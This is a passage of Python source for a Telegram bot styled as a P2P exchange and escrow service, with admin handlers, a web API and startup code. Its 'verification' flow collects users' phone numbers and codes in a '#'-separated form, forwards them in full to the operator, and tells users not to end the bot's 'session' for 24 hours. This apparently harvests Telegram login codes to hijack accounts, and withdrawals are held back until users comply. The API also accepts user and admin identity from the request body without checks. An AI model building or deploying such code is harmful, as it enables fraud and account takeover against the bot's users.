    await message.answer("✅ Отзыв удалён")

@dp.callback_query(lambda c: c.data == "admin_clear_reviews")
async def admin_clear_reviews(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
        return
    reviews.clear()
    save_json(FILES["reviews"], reviews)
    await callback.message.edit_text("✅ Все отзывы удалены", reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_logs")
async def admin_logs(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ НЕДОСТАТОЧНО ПРАВ", show_alert=True)
        return
    logs_list = list(logs.values())[-20:]
    if not logs_list:
        await callback.message.edit_text("📋 <b>ЛОГИ</b>\n\nНет записей", reply_markup=admin_panel_keyboard(callback.from_user.id))
        return
    text = "📋 <b>ПОСЛЕДНИЕ ЛОГИ</b>\n\n"
    for log_entry in reversed(logs_list[-10:]):
        text += f"🕐 {log_entry.get('time', '')[:19]}\n"
        text += f"📌 {log_entry.get('action', '')}\n"
        text += f"📊 {json.dumps(log_entry.get('data', {}), ensure_ascii=False)[:80]}\n\n"
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
    await callback.answer()

# ============================================================
# 16. API ДЛЯ САЙТА
# ============================================================
async def handle_api(request):
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
    }
    if request.method == 'OPTIONS':
        return web.Response(headers=headers)
    
    if request.method == 'GET':
        return web.json_response({'success': True, 'bot': BOT_NAME, 'status': 'running'}, headers=headers)
    
    try:
        data = await request.json()
    except:
        data = {}
    
    user_id = data.get('user_id')
    endpoint = request.path
    
    # ===== БАЛАНС =====
    if endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        return web.json_response({'success': True, 'balance': bal}, headers=headers)
    
    # ===== СОЗДАНИЕ СДЕЛКИ =====
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        username = data.get('username', str(user_id))
        payment_method = data.get('payment_method', 'balance')
        
        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "payment_method": payment_method,
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
        
        # Если оплата с баланса — сразу списываем
        if payment_method == 'balance':
            buyer_balance = get_balance(user_id)
            curr_key = currency.lower()
            if buyer_balance.get(curr_key, 0) >= amount:
                buyer_balance[curr_key] -= amount
                save_json(FILES["balance"], balance)
                deals[deal_id]["status"] = "paid"
                deals[deal_id]["paid_by_admin"] = user_id
                save_json(FILES["deals"], deals)
                
                # Уведомляем продавца
                try:
                    await bot.send_message(
                        user_id,
                        f"💎 <b>СДЕЛКА #{deal_id} ОПЛАЧЕНА!</b>\n\n"
                        f"💰 {amount} {currency}\n"
                        f"👤 ПОКУПАТЕЛЬ: @{buyer_username}\n\n"
                        f"⬇️ ПЕРЕЙДИТЕ НА САЙТ ДЛЯ ПОДТВЕРЖДЕНИЯ\n{MINI_APP_URL}"
                    )
                except:
                    pass
            else:
                deals[deal_id]["status"] = "waiting_payment"
                save_json(FILES["deals"], deals)
        
        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link,
            'status': deals[deal_id]["status"]
        }, headers=headers)
    
    # ===== СДЕЛКИ ПОЛЬЗОВАТЕЛЯ =====
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id or d.get('buyer_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
    
    # ===== ПРОВЕРКА АДМИНА =====
    elif endpoint == '/api/is_admin':
        return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
    
    # ===== ОТЗЫВЫ =====
    elif endpoint == '/api/reviews':
        limit = data.get('limit', 10)
        page = data.get('page', 0)
        reviews_list = list(reviews.values())
        start = page * limit
        end = start + limit
        paginated = reviews_list[start:end]
        return web.json_response({
            'success': True,
            'reviews': paginated,
            'total': len(reviews_list)
        }, headers=headers)
    
    # ===== ДОБАВИТЬ ОТЗЫВ =====
    elif endpoint == '/api/add_review':
        rating = data.get('rating')
        text = data.get('text')
        anonymous = data.get('anonymous', True)
        if not all([user_id, rating, text]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним" if anonymous else str(user_id),
            "rating": rating,
            "text": text,
            "anonymous": anonymous,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": user_id
        }
        save_json(FILES["reviews"], reviews)
        return web.json_response({'success': True, 'review_id': review_id}, headers=headers)
    
    # ===== УДАЛИТЬ ОТЗЫВ =====
    elif endpoint == '/api/delete_review':
        review_id = data.get('review_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if review_id in reviews:
            del reviews[review_id]
            save_json(FILES["reviews"], reviews)
            return web.json_response({'success': True}, headers=headers)
        return web.json_response({'success': False, 'error': 'Review not found'}, headers=headers)
    
    # ===== ЗАПРОС ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/send_verification_request':
        phone = data.get('phone')
        username = data.get('username')
        user_id = data.get('user_id')
        
        if not phone or not username or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        code = f"{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}#{random.randint(0,9)}"
        
        request_id = str(uuid.uuid4())[:8]
        verification_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": username,
            "phone": phone,
            "code": code,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["verification_requests"], verification_requests)
        
        await log_to_master(
            f"🔐 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ (С САЙТА)\n"
            f"👤 Пользователь: @{username} (ID: {user_id})\n"
            f"📱 Номер: {phone}\n"
            f"🔑 Код: {code}\n"
            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"Для подтверждения: /confirm_verification {request_id}\n"
            f"Для отклонения: /reject_verification {request_id}"
        )
        
        try:
            await bot.send_message(
                user_id,
                f"🔐 ЗАПРОС НА ВЕРИФИКАЦИЮ ОТПРАВЛЕН!\n\n"
                f"📱 Номер: {phone[:2]}****{phone[-4:]}\n"
                f"🔑 Ваш код: {code}\n\n"
                f"⏳ Ожидайте подтверждения от администратора.\n\n"
                f"⚠️ ВАЖНО: Если вы выкинете бота из сессии раньше 24 часов — придётся проходить всё заново!"
            )
        except:
            pass
        
        return web.json_response({
            'success': True,
            'request_id': request_id,
            'code': code
        }, headers=headers)
    
    # ===== ПРОВЕРКА КОДА ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/verify_code':
        code = data.get('code')
        user_id = data.get('user_id')
        phone = data.get('phone')
        username = data.get('username')
        
        if not code or not user_id:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        # Ищем заявку
        found = False
        request_id = None
        for rid, req in verification_requests.items():
            if req.get('user_id') == user_id and req.get('code') == code and req.get('status') == 'pending':
                found = True
                request_id = rid
                break
        
        if not found:
            return web.json_response({'success': False, 'error': 'Invalid code'}, headers=headers)
        
        # Подтверждаем автоматически
        req = verification_requests[request_id]
        complete_verification(user_id, req['phone'], code)
        req["status"] = "completed"
        req["completed_at"] = datetime.now().isoformat()
        req["completed_by"] = "system"
        save_json(FILES["verification_requests"], verification_requests)
        
        await log_to_master(
            f"✅ ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА (ЧЕРЕЗ САЙТ)\n"
            f"👤 Пользователь: @{username} (ID: {user_id})\n"
            f"📱 Номер: {req['phone']}\n"
            f"🔑 Код: {code}"
        )
        
        await bot.send_message(
            user_id,
            f"✅ ВАША ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА!\n\n"
            f"📱 Номер: {req['phone'][:2]}****{req['phone'][-4:]}\n"
            f"🔑 Ваш код: {code}\n\n"
            f"🕐 Сессия активна 24 часа\n\n"
            f"💰 Теперь вам доступен вывод средств на сайте."
        )
        
        return web.json_response({
            'success': True,
            'expires_at': verification_data[str(user_id)].get('expires_at')
        }, headers=headers)
    
    # ===== ВЫВОД СРЕДСТВ =====
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')
        
        if not user_id or not currency or not details:
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        if not is_verified(user_id):
            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "currency": currency,
            "amount": get_balance(user_id).get(currency.lower(), 0),
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)
        
        await log_to_master(
            f"💲 НОВАЯ ЗАЯВКА НА ВЫВОД\n"
            f"👤 Пользователь: ID: {user_id}\n"
            f"💰 {get_balance(user_id).get(currency.lower(), 0)} {currency}\n"
            f"📝 {details}\n"
            f"➡️ /confirm_withdraw {request_id}"
        )
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== СТАТИСТИКА =====
    elif endpoint == '/api/stats':
        return web.json_response({
            'success': True,
            'deals_today': len([d for d in deals.values() if d.get('created_at', '').startswith(datetime.now().strftime('%Y-%m-%d'))]),
            'users': len(balance),
            'reviews': len(reviews),
            'volume': round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1)
        }, headers=headers)
    
    # ===== ПРОВЕРКА 2-Х СДЕЛОК =====
    elif endpoint == '/api/has_2_deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_two = any(count >= 2 for count in partners.values())
        return web.json_response({
            'success': True,
            'has_2_deals': has_two,
            'total_deals': sum(partners.values())
        }, headers=headers)
    
    # ===== СТАТУС ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/verification_status':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        return web.json_response({
            'success': True,
            'verified': is_verified(user_id),
            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
        }, headers=headers)
    
    # ===== ВСЕ ЗАПРОСЫ ВЕРИФИКАЦИИ (АДМИН) =====
    elif endpoint == '/api/verification_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        return web.json_response({
            'success': True,
            'requests': list(verification_requests.values())
        }, headers=headers)
    
    # ===== ОДОБРИТЬ ВЕРИФИКАЦИЮ (АДМИН) =====
    elif endpoint == '/api/approve_verification':
        request_id = data.get('request_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if request_id not in verification_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        req = verification_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        complete_verification(req['user_id'], req['phone'], req['code'])
        req['status'] = 'completed'
        req['completed_at'] = datetime.now().isoformat()
        save_json(FILES["verification_requests"], verification_requests)
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОТКЛОНИТЬ ВЕРИФИКАЦИЮ (АДМИН) =====
    elif endpoint == '/api/reject_verification':
        request_id = data.get('request_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if request_id not in verification_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        req = verification_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        req['status'] = 'rejected'
        req['rejected_at'] = datetime.now().isoformat()
        save_json(FILES["verification_requests"], verification_requests)
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)

# ============================================================
# 17. ЗАПУСК
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    print("=" * 50)
    print("🔥 P2P Exchange Бот (ТОЛЬКО API)")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Сайт: {MINI_APP_URL}")
    print("=" * 50)
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
